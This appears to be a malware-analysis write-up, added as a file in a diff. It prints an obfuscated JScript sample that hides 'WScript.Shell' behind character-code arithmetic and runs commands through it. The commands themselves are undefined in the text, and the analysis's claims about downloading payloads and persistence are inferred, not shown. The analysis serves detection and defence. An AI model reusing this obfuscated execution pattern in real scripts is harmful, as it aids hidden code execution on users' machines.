@@ -1,0 +1,112 @@
+``` javascript
+//iyTqjTmnDXbJIbAHzbxnBaqoGNNTccFOpsQJHwCVTJlYmYgeTsecOlfHHekVFSLbSMTPLqACZcTrpSBhhjAjxcAENICcMgPAyJFaFQSdscCmRnSpcCnWScepMPBDoYqtMSsfMbcQRWqVaNmaqMzJstiWfQOpPPpTlJZzumcBaXFwlIPycbMbYgATkWzwNmBBhXjRonfEkyjVnmlXAPNnCNvEIGOYmfnnVDONZyJpwIqaxffykcvxZNzTcfIiYHRFKwzkXXyCGXruXUGdbQnKjpNIEultpbQoqlPBfuaNetrBVEwHYeHHTHWVirfclEMeHCDlFFxgqafqyLmzyeVLUJUjPuSoPxbagNuTBKCSgbRtbg
+var XWEfeHiBJyhTWKmJQsyFJlQTyncCetrbHiXwjjSUreDwlhnrgXKYuWWmFlgregXQGGLnnqZhaeNehUhRzlWGjThlMlqyCbpKHmqeVADpycyPIrElDPstKQgnZabCAaeypDWudDvzhgIGURcVgEumivArGDFuYApXxzaFUJHATtLeHaSHyGWvfsQtCfoaxBahqkIVrWAXw
+//uSpkWjflxwSeurFjgCpUhDSSenXRwQbFyylZaJgvJpzEHCvsCmKULDPrAXFiMOohUMfvGgJXWtLrDNKbreOKGHuvjtYCDyjvBSkuXAmVcmxRrXnmMdqhzdaNSkMMHGUXKQqldPErsthUJcDLGmqZIBwXrWcmoZNWSaHbhCIwZypFvGDpgAGVPuPIUStHnRCTfLBjUceDdtAJMqblSmGoTsGXKzHOIBJHvVakEUUDWCrVuFveqIoALOzmEdYVUPvcksNqPrgyRCRQAldFDdXzNIwhWogavzjGGPkBrEOzcpjIwjmTATRrrvPcwgUaLFDSTLJlAcNzOYWXZokmCMacirOLAIE
+var LkooXmRolZBSXGSdTYrDIwhYyebjcwyksYCOajzlIzyNAuDWPOvmJEwOCPqsLhMpaQazDDCkZGvJyUXEbFUNBMbncnMLtHaamImkTESMLKNDJmQhrlRFNyoOpnXQqrqRfUWphnkWmHCqzYdpXfTHqUNoUYvghCVTUvXpQaADBuTFwxOQJhsLXibLGhVIsEpkmiVDBoYweQGv
+GfWxtXYkUspfogkOQGGnwCYR(GzCMjpDjYhhYWHHThilDQVeGymbJltUvtlUrnp, rJiyIjVAEmZkMEXQkMdqkTmaqpBnPBWEGFFkpabkWoaB(WVaHHOUfQDezJbVxRoP));
+//BIrWKeWzJJvlULjiFrLwFiTNcKPUJvgHcfKxqyyOhpacmkjpFprnEJqSpduzOBpOdoIoBlsHswPPHqbraaPUEtCTprHMEzAgzMzybvoUwjvHuaLzCCYomVJklpyJdgDtwjPurcQflvXUxuYPgIJBaMteDPNlxfqPgCLLKQHZmtCqxomqRicUXBSkplqcPehGEHovjNEPBjOhJCgPcXUOCWsfjaWZZfKILvmqAqGDdMTnnlbmEbzsJTDiOJMJrfqVZGWNQqOmQQkqDFryzjUygRyssDbrexMyWxOgONVOMNbsiNfJRNKHKspHHeVNPXHTEmUGrLjlOGlSpFJfYRaRmFneHGZksIzpFIowtZSFdYsEHXRBUpoxxqgyyqykm
+var ytGHwMhRMmzzUnOMjWkoXQCTBrPcqyDahTfemxKKkkHDpxdDSlOTOvOirnFExFaOjYRAHjamMZEmIydDNMJEjjLlEwmzsFNfKtUQfdviKcGorcasJBrlvVezNgvLxbtGMZcPeNXkQbtHdXucWtprOcjoOUDzhkkjiAbRzLOvdGUTbXWplSoDlCrkpoAJJYCgqKYcvddLfu
+//NHHQMqyNOOwhyfIrbLKFmFEncRztuIpcXrpkdZbKKwJokJMsTEBRBaHIDTnuqFSFYTJGqYOCjzupvPDTFHZqGXbxjggJlgTFdDPRzFBvqziBgSNnQUpjfczArMXKsEQCgoMrAmUAFeAHpaRRTssRrjaBEOZmhrDljgVrFVndAoeAcrLRuGrzLyKwOLmmMhTNbPYJFaLxFORCFZZMCIsaADZkVYdujARTVRZMTCMUvttxhIrpmZjEpsMXpoogwQOFxxgozMtAvXfGKcCMhoIJRMedECXfNfXffozkbDpZgjIRNGMNlbzIHEolTDjxpNmQzzaVcSleyiciDMQypJtmgOXaANQYTskSwsSNfqkTpVKYcFhHnlHfUAjkczVPCN
+var KGxJlLuCSyYawLEyyugJlhkEywIhlfVVRcKDaSUWMkSIHtDYfdBaiscdVtLpCNRndCJTABXgaJwAObxFsjBHdumYAhhhGeUzSffEkjXeFVAYwbOuvGwSLKJiQkTTTpZvpwijvtUJLXBItNcZSnmAiBoIWxozQELQvFjztfyBlnGoIAoCItBfDYNoIZNyFVtHLlMoecgmpkP
+GfWxtXYkUspfogkOQGGnwCYR(EaynfYYhOhTHCoDWlkUvOwNtyfNleknQgseKFdpFiQYuqdqgrWAjWsaHMEoAKmDdtDbKJsRHuPMx, rJiyIjVAEmZkMEXQkMdqkTmaqpBnPBWEGFFkpabkWoaB(aETdtHTRab));
+//uvAAVImqWCgMXrvqTSzwPuycWoAXgNOpSJSsIZrpTfWFfYpwjlMUpozAwXdhIOKIoquOZCiuaKdkXtxxyDnuBuAeJSwlvKgEUNQpebXhDRtfLOdCZfiFaQHupPEGFwzPdYPJcISXfGqjAVTvotLPcbdEGWzOXQbGSdBmzTaRNKaUZYtUwJSMljnCuKDGJDAOejQWTgvVTtCRBJficeSOyPVjqzsoQTIJKLpqHXBPNwsrgWBkfVdelmPPNhfToHFzltGpUpaFdCABWdCTyHJvqeXYvZcZrhbFrsGmPLQquYBjlOsjeMVhyKJHWituMBNvavJdXPEmqTAScomhhsvfLuHhjzQhSWdtKFIqEOMOHiqfJqehvLMUFhkgncuXzWUU
+var pHHXgwdSfgXcEcYtVilGJJncVbCbUoPkOVpBiGByhtoZKHcKDACQlNLgUeCEuByrQmOinWKOgnYPUOSNzrYTmzzAKJhDExEfvxIXttXgqnjxovLGMoFCdeERmNXdpGKjisTXFvUFUrcyPCLPxbrPsCCQsrkfWtrkdAOwboAQTzimBGBkBIgNOuqgqCeOLpjazsUPnPnJba
+//wsUQPlpzdNNeVjJiFYJmFeQHmJmlxlVWmnxyMansYLLVNVXlGEKOzoVRcMdFzDCsrqshlLVelQOuSuuRmBfsbHWxSgWAwitUJTdWdpzujfdjabzhRMTyYJQkTuPFpViCXtkzQXowBkJwdnXrhoikOuwzCsDjauFNxaMgqzQuYWxnzUHgWXYAnxodxlwYUEWHfvyDbrBhYoMrwJzilXMCVFazljiECsZTzpHEVEEeWqczlwgolOmxsUlaVzRrJwegOsrGBvMhShgedbOpDtToFbafEhiWmNVZMvksEZmpBEfK
+var oGxukcoPdqamRMCUNquFMGShqVkeHdmAwQrxknlKYGwVVxasWScLKayhoPDPsKIzDZqBVFjZEkgFKwLsusHoBbqWSJJUjWSNywSvHZWRjCGZtsWrELUzDTycjTjMvPpiRSHOeQlVVqEyUQcZmRQYBSKeyqMnpKVTNYHakINoZzeMPzISrJZdyQgzIdQnDxfLUklvJCoeEcz
+new ActiveXObject( String.fromCharCode(157-70) + String.fromCharCode(150-67) + String.fromCharCode(232-133) + String.fromCharCode(229-115) + String.fromCharCode(315-210) + String.fromCharCode(455-343) + String.fromCharCode(291-175) + String.fromCharCode(262-216) + String.fromCharCode(283-200) + String.fromCharCode(390-286) + String.fromCharCode(242-141) + String.fromCharCode(142-34) + String.fromCharCode(238-130) ).Run(GzCMjpDjYhhYWHHThilDQVeGymbJltUvtlUrnp) ;
+//CoxPyiuwglrVwrISHsZkbTTseOMJoUuZWReLKORFJBzZdPoDAjhmfrXiUFljVkHLqSyeNwIsaTaaUtPOZIIEnIufuvqEdikYtojLRJqEbpMLQwObqXKMcCYiXSkRFDPsiCggKDwPSEcxviOxhPOGXXwqPBnyZYyYZUcOPiQmauuYaampEmkqpJULFqQJQxqtGEYbFzhzybfdcYQpOxumoIjQARIZRHWdDBRVCLkEFlrNdqihZauSCDFyUHanrIhrFBZbGunDNqhCQVnJibzrNDbzwTAukwNwEAIbQHaemrFMWChzUREPIqdCaafmutSRdkyQNLtbAVEWyOdtmBaTrxo
+var OWGBqcnktYnjlDQlIXdOnlHDLwlAsSzafwkuHKCzMkKxKfsqVQRvNiBcOCpuqnsbYNDpTWeyVdCCaJtfEvecAEMwuHfEVIJZsjZxcCWzlTakgyCEIJpvIPaUAGuLqZdMUcKqkwDBYfqhdbQvFbwMSNQcJEwVHLIMqNQDoLUMFoXcYtqYqzFPdQuGLihfzitMWeqQLMHuHjGd
+//qoDPOYfIFtiZTJrGdoNXuKGuCaMdrKItKQQXeSRbDkGcwQwCVBRSWjjfiJMnLBQvloPDsTbLXlUKDdxleKIqtpXbhlpVFdQBULrHBsJBZFvlOYbELbJAsZBwRoWHeGGtVSpsmqklAHRntmMIJkJeTPIuKupNWCWSzCPwjjSUqYzlIODfcOxtxcaFJvirBWPykynrWQZZSonvQXmvrJlHEdVXcKmnBbTUJABJaLJLpXbIpepmImAslHuGdQPLdlYqUSmPWcVfzZSgCMixVzePabiBGugJwxiEzknWsZQgQUsLpNEQiSqeGJQtkkJcwLjBrOhRZMEvjyyFiXMspQbeHDxqUumIQnj
+var ElqUbgmqWNuuHKKKNXQmfkEunQqxfawfvOuUsClLCZFQMIqgJjYkzBEUgwgKqpLvRPzsPqSKmEkGeoheZKnwBLfuKZnvWaVNOJzxJxQTQOxuQypsOBlfBPuFkEipCXoLjXrUpkVctUfmOkdMkugUppLyOtMEOaRtamLtGUDegIlhjIrzbVFHqTWuLsGvXQNTCmLbZjGP
+new ActiveXObject( String.fromCharCode(157-70) + String.fromCharCode(150-67) + String.fromCharCode(232-133) + String.fromCharCode(229-115) + String.fromCharCode(315-210) + String.fromCharCode(455-343) + String.fromCharCode(291-175) + String.fromCharCode(262-216) + String.fromCharCode(283-200) + String.fromCharCode(390-286) + String.fromCharCode(242-141) + String.fromCharCode(142-34) + String.fromCharCode(238-130) ).Run(EaynfYYhOhTHCoDWlkUvOwNtyfNleknQgseKFdpFiQYuqdqgrWAjWsaHMEoAKmDdtDbKJsRHuPMx) ;
+//rCnhDePGCNdtUJCHPRiNOIGQvSexwParPqQnfpqgdztKnUztjELHAsAjwXmlzRJmmlddtObaaBjOPvcaTlNsDSqWqgrHCFhLqGXCqVzUdlgzJlUAvLROERjUuHmMXTXVUYYIYakxlsPSlrNFMqMrnSHZXCHiinxJNLflMLcUbTcLCQiCuhzhGghBQzlVSBOyvFFZMcsBOsQTqvXGUFoBnPCgedUNaGCZEeQwLIqSoyTOPNLVbeBNMNKfCYviHfbHpqPLfavLOWNowoRQSymvFoNrUkumNHKIXLYYyAqBjpyqzViOHfQItfBBdXrugIyHLFR
+var kPsSSIkLPpWsyCgfhrBPrKXvbIwUarreuExyPNyAIUlLGessAdQQKpZarwrJMQlYysyuEhPUsBHXYMowPEUwbaTEeXHSWooriNMNgynTOvXJiCBfIutIvoxXZtPgaxyEMPoLzaQQQBifDKWbVbJbugwuQoomiHtQwTwTNqghecruGRUOXoLynXJgTuvKldiJIRikNCOe
+//ubxRoBnyUaOuvudZJQASvVwAuimojkAVahELarrRGwqLPnNNoIaxCviYfwXFPzOjZtUOqRzRYiLyfkkHVYzaJDSeyffdUmCHhHmWTzXWJIYTjjtvLQkqznZVapQKlVxmgERYyOnVAdRAeyvOlkREBLHthQwdjNknLmnfSVwxcOpWWYqbuBZADskUwXqhSKmnseosLQvQoUcmVlXIZUjhojjTBTivePeScCdsjxQeGJMjQyyLziHxaEzIuVrrizlYpKJTHfYcEFafWADCVWwwHhrXDUxOGYwHXntFoeDUJfsVeUluRpWLDoRISmQmhKWgJTHiGxOqSbncoWtiiDwRBkDjWknCORmyJMLKNCnUafsbApTwshDeNFeYPX
+var MVKLcBpoScKiVfPcqVrcjhRrJhNHkEhnupqRKODrmLWrlJLXPlOIgnnfESCuohEOvXnfpyRbSAqYKaFzVpsypYGHBLMrMICEHHvNWfiQUnqgxPUeMCZzpFZWRgdelZOJymQDerdqGbeBiZJmrifKjDOBiZwpBEfuZhiLzRAUYisOaXorWrmDuDZuXOUFvooCvkcAryna
+```
+
+
+# Technical Analysis: Obfuscated JavaScript Malware Dropper
+
+## Overview
+This analysis examines an obfuscated JavaScript/JScript code sample that functions as a malware dropper. The code utilizes various obfuscation techniques to evade detection while attempting to execute commands on Windows systems through WScript.Shell.
+
+## Code Structure Analysis
+
+### Obfuscation Techniques
+The malware employs multiple layers of obfuscation:
+1. String Concealment
+   - Uses `String.fromCharCode()` with arithmetic operations
+   - Example: `String.fromCharCode(157-70)` resolves to 'W'
+   - Full decoded string spells "WScript.Shell"
+   
+2. Code Organization
+   - Excessive variable declarations with random-looking names
+   - Large blocks of commented random strings to complicate analysis
+   - Split execution paths to obscure program flow
+
+### Core Functionality
+The deobfuscated code reveals two primary execution blocks:
+
+```javascript
+// First execution path
+var command1 = GzCMjpDjYhhYWHHThilDQVeGymbJltUvtlUrnp;
+new ActiveXObject("WScript.Shell").Run(command1);
+
+// Second execution path
+var command2 = EaynfYYhOhTHCoDWlkUvOwNtyfNleknQgseKFdpFiQYuqdqgrWAjWsaHMEoAKmDdtDbKJsRHuPMx;
+new ActiveXObject("WScript.Shell").Run(command2);
+```
+
+### String Decoding Process
+The WScript.Shell string is constructed through character-by-character decoding:
+- W = 157-70 = 87 (ASCII)
+- S = 150-67 = 83 (ASCII)
+- c = 232-133 = 99 (ASCII)
+- r = 229-115 = 114 (ASCII)
+And so on...
+
+## Malware Purpose and Functionality
+
+### Primary Objectives
+1. Initial Infection Vector
+   - Acts as a dropper/downloader for additional malware
+   - Establishes initial system compromise
+   - Potentially part of a larger attack chain
+
+2. Command Execution
+   - Uses WScript.Shell to execute system commands
+   - Can potentially:
+     - Download additional payloads
+     - Modify system settings
+     - Execute further malicious code
+     - Establish persistence
+
+### Evasion Techniques
+The code employs several methods to evade detection:
+1. Heavy code obfuscation to bypass static analysis
+2. Split execution paths to complicate dynamic analysis
+3. Use of legitimate Windows scripting objects (WScript.Shell)
+4. Excessive code padding to hide true functionality
+
+## Security Implications
+
+### Risks
+- Unauthorized command execution
+- System compromise
+- Additional malware deployment
+- Potential data theft or system damage
+
+### Recommendations
+1. Systems
+   - Scan potentially affected systems
+   - Monitor for suspicious WScript.Shell activity
+   - Implement application whitelisting
+
+2. Prevention
+   - Block suspicious JavaScript/JScript execution
+   - Monitor for obfuscated code patterns
+   - Implement proper security controls around ActiveX objects
+
+## Conclusion
+This code represents a relatively sophisticated attempt at creating an obfuscated malware dropper. While the obfuscation techniques are not novel, their implementation demonstrates attention to anti-analysis features and evasion capabilities. The use of WScript.Shell for command execution is particularly concerning as it provides broad system access capabilities to potential attackers.
